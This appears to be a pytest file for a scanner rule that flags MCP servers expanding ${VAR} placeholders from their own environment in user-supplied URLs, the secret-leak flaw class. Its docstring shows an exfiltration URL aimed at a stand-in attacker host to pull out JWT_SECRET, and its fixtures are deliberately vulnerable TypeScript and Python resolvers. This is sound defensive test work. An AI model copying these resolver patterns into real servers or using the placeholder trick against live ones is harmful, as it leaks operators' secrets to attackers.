"""Tests for AAK-MCP-ENV-PLACEHOLDER-EXFIL-001 (CVE-2026-32625 class).

An MCP server that resolves ${VAR} placeholders against its own process
environment while handling a user-supplied server URL/config leaks its secrets:
a user submits https://attacker/?k=${JWT_SECRET} and the server interpolates
JWT_SECRET into the outbound request. LibreChat <= 0.8.3 did exactly this
during Zod validation of MCP server URLs (CWE-200, CVSS 9.6).

Fixtures: the TS replace-against-process.env shape and the Python
os.path.expandvars / format(**os.environ) shapes FAIL; benign config handling
and non-MCP files PASS.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from agent_audit_kit.rules.builtin import RULES
from agent_audit_kit.scanners.mcp_env_placeholder_exfil import scan

RULE_ID = "AAK-MCP-ENV-PLACEHOLDER-EXFIL-001"


def _write(tmp_path: Path, name: str, src: str) -> None:
    (tmp_path / name).write_text(src, encoding="utf-8")


def _hits(findings: list) -> list:
    return [f for f in findings if f.rule_id == RULE_ID]


# ---------------------------------------------------------------------------
# Rule registration
# ---------------------------------------------------------------------------


def test_rule_is_registered_with_cve_anchor() -> None:
    assert RULE_ID in RULES
    rule = RULES[RULE_ID]
    assert rule.severity.value == "critical"
    assert "CVE-2026-32625" in rule.cve_references


# ---------------------------------------------------------------------------
# Vulnerable — must fire.
# ---------------------------------------------------------------------------


def test_typescript_replace_against_process_env_is_flagged(tmp_path: Path) -> None:
    """The CVE-2026-32625 shape: resolve ${VAR} against process.env on the
    user-supplied MCP server URL."""
    _write(tmp_path, "mcp.ts", r'''
import { z } from "zod";
// MCP server URL schema
const mcpServerUrl = z.string().transform((url) =>
  url.replace(/\$\{(\w+)\}/g, (_, k) => process.env[k] ?? "")
);
''')
    findings, scanned = scan(tmp_path)
    assert "mcp.ts" in scanned
    assert _hits(findings), f"TS ${{VAR}}->process.env resolver must fire {RULE_ID}"


def test_python_expandvars_on_mcp_url_is_flagged(tmp_path: Path) -> None:
    _write(tmp_path, "server.py", '''
import os
from mcp.server import Server

def register_mcp_server(server_url: str):
    # expands $VAR / ${VAR} against os.environ on user-supplied URL
    resolved = os.path.expandvars(server_url)
    return connect(resolved)
''')
    findings, _ = scan(tmp_path)
    assert _hits(findings), "os.path.expandvars on an MCP URL must fire"


def test_python_format_environ_is_flagged(tmp_path: Path) -> None:
    _write(tmp_path, "cfg.py", '''
import os
# mcpServers config template
def build_mcp_url(template: str) -> str:
    return template.format(**os.environ)
''')
    findings, _ = scan(tmp_path)
    assert _hits(findings), "format(**os.environ) on a template must fire"


# ---------------------------------------------------------------------------
# Safe — must pass.
# ---------------------------------------------------------------------------


def test_url_used_as_is_passes(tmp_path: Path) -> None:
    """An MCP server that uses the user URL verbatim (no env expansion) is
    safe for this rule."""
    _write(tmp_path, "mcp.ts", r'''
import { z } from "zod";
const mcpServerUrl = z.string().url();
function connectMcp(url: string) {
  return fetch(url);
}
''')
    findings, _ = scan(tmp_path)
    assert not _hits(findings), "no env-placeholder resolution -> must pass"


def test_startup_env_read_not_on_placeholder_passes(tmp_path: Path) -> None:
    """Reading process.env normally (not as a ${VAR} placeholder resolver
    over user config) must not fire."""
    _write(tmp_path, "mcp.ts", '''
import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
const port = process.env.PORT || "3000";
const server = new McpServer({ name: "x", version: "1.0.0" });
''')
    findings, _ = scan(tmp_path)
    assert not _hits(findings), "plain process.env read must not fire"


def test_non_mcp_file_passes(tmp_path: Path) -> None:
    """expandvars in a non-MCP file is out of scope (no MCP context gate)."""
    _write(tmp_path, "deploy.py", '''
import os
path = os.path.expandvars("$HOME/.config/app")
''')
    findings, _ = scan(tmp_path)
    assert not _hits(findings), "non-MCP file must not fire"


def test_comment_mentioning_process_env_does_not_fire(tmp_path: Path) -> None:
    """A comment referencing the pattern must not create a false positive
    (TS comments are stripped before matching)."""
    _write(tmp_path, "mcp.ts", r'''
import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
// historically we did url.replace(/\$\{x\}/, () => process.env.x) — removed
function connectMcp(url: string) { return fetch(url); }
''')
    findings, _ = scan(tmp_path)
    assert not _hits(findings), "commented-out pattern must not fire"


# ---------------------------------------------------------------------------
# A crafted file reads in linear time, and the call shapes keep their result.
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(("src", "fires"), [
    ('const u = url.replace(/\\$\\{(\\w+)\\}/g, (_, k) => process.env[k]);\n', True),
    # A second `.replace(` before the placeholder reads it too.
    ('const u = a.replace("x", y.replace(/\\$\\{(\\w+)\\}/g, (_, k) => process.env[k]));\n', True),
    ('const u = url.replace(/x/g, "y"); const k = process.env.KEY;\n', False),  # a `;` ends the call
])
def test_replace_shapes_keep_their_result(tmp_path: Path, src: str, fires: bool) -> None:
    _write(tmp_path, "mcp.ts", 'import { McpServer } from "@modelcontextprotocol/sdk";\n' + src)
    findings, _ = scan(tmp_path)
    assert bool(_hits(findings)) is fires


@pytest.mark.parametrize("unit", [".replace(", ".replace(${", "/* a"])
def test_a_crafted_source_scans_in_linear_time(tmp_path: Path, unit: str) -> None:
    """About 1 MB of `.replace(` with no `;`: every call read on to the end of the
    file, and every unclosed `/*` did too. The bound is loose for slow CI runners."""
    import time

    _write(tmp_path, "mcp.ts", 'import { McpServer } from "@modelcontextprotocol/sdk";\n' + unit * (990_000 // len(unit)))
    started = time.perf_counter()
    scan(tmp_path)
    assert time.perf_counter() - started < 5.0


# ---------------------------------------------------------------------------
# The resolver is read under its imported and aliased spellings
#
# Python needed the dotted `os.path.expandvars(` and `.format(**os.environ)`, and
# the TypeScript arm the literal `process.env` inside `.replace(`. So
# `from os.path import expandvars`, `import os.path as osp`, `string.Template(...)
# .substitute(os.environ)`, `from os import environ`, `const env = process.env;`,
# `const { env } = process;` and `.replaceAll(` were each silent.
# ---------------------------------------------------------------------------

_PY_HEAD = "# mcp server config handler\n"


@pytest.mark.parametrize(
    "src",
    [
        "from os.path import expandvars\n\ndef normalise(cfg):\n    return expandvars(cfg['serverUrl'])\n",
        "from os.path import expandvars as ev\n\ndef normalise(cfg):\n    return ev(cfg['serverUrl'])\n",
        "import os.path as osp\n\ndef normalise(cfg):\n    return osp.expandvars(cfg['serverUrl'])\n",
        "from os import path\n\ndef normalise(cfg):\n    return path.expandvars(cfg['serverUrl'])\n",
        "import posixpath\n\ndef normalise(cfg):\n    return posixpath.expandvars(cfg['serverUrl'])\n",
        "import os\nimport string\n\ndef normalise(cfg):\n    return string.Template(cfg['serverUrl']).substitute(os.environ)\n",
        "import os\nfrom string import Template\n\ndef normalise(cfg):\n    return Template(cfg['serverUrl']).safe_substitute(**os.environ)\n",
        "from os import environ\n\ndef normalise(cfg):\n    return cfg['serverUrl'].format(**environ)\n",
        "from os import environ as env\n\ndef normalise(cfg):\n    return cfg['serverUrl'].format_map(env)\n",
    ],
    ids=["from-import", "from-import-as", "module-alias", "from-os-import-path", "posixpath",
         "template-substitute", "template-safe-substitute", "environ-imported", "environ-alias"],
)
def test_python_resolver_spellings_are_flagged(tmp_path: Path, src: str) -> None:
    _write(tmp_path, "server.py", _PY_HEAD + src)
    (hit,) = _hits(scan(tmp_path)[0])
    assert hit.line_number == len((_PY_HEAD + src).splitlines())


_TS_RESOLVE = 'export function normalise(url: string): string {\n  return url.REPLACE(/\\$\\{(\\w+)\\}/g, (_m, k) => ENV[k] ?? "");\n}\n'


@pytest.mark.parametrize(
    "binding, method, env",
    [
        ("const env = process.env;\n", "replace", "env"),
        ("let vars = process.env\n", "replace", "vars"),
        ("const { env } = process;\n", "replace", "env"),
        ("const { env: e, argv } = process;\n", "replace", "e"),
        ('import { env } from "node:process";\n', "replace", "env"),
        ("", "replaceAll", "process.env"),
    ],
)
def test_typescript_resolver_spellings_are_flagged(tmp_path: Path, binding: str, method: str, env: str) -> None:
    src = "// mcp server url handling\n" + binding + _TS_RESOLVE.replace("REPLACE", method).replace("ENV", env)
    _write(tmp_path, "mcp.ts", src)
    assert _hits(scan(tmp_path)[0])


@pytest.mark.parametrize(
    "name, src",
    [
        ("server.py", _PY_HEAD + "def expandvars(value):\n    return value\n\nURL = expandvars('x')\n"),
        ("server.py", _PY_HEAD + "import string\n\nURL = string.Template('$a').substitute({'a': 1})\n"),
        ("server.py", _PY_HEAD + "from os import environ\n\nPORT = environ.get('PORT')\n"),
        ("mcp.ts", "// mcp server\nconst mode = process.env.NODE_ENV;\n"
                   'const u = url.replace(/\\$\\{(\\w+)\\}/g, (_m, k) => mode[k] ?? "");\n'),
        ("mcp.ts", "// mcp server\nconst env = process.env;\nconst port = env.PORT;\n"),
    ],
    ids=["local-expandvars", "template-with-a-dict", "environ-read", "env-property-alias", "env-alias-no-resolver"],
)
def test_other_uses_of_the_names_are_not_flagged(tmp_path: Path, name: str, src: str) -> None:
    _write(tmp_path, name, src)
    assert not _hits(scan(tmp_path)[0])


@pytest.mark.parametrize("unit", [".replaceAll(", ".replaceAll(${", "const env = process.env;\n.replace(${"])
def test_a_crafted_aliased_source_scans_in_linear_time(tmp_path: Path, unit: str) -> None:
    import time

    _write(tmp_path, "mcp.ts", 'import { McpServer } from "@modelcontextprotocol/sdk";\n' + unit * (990_000 // len(unit)))
    started = time.perf_counter()
    scan(tmp_path)
    assert time.perf_counter() - started < 5.0
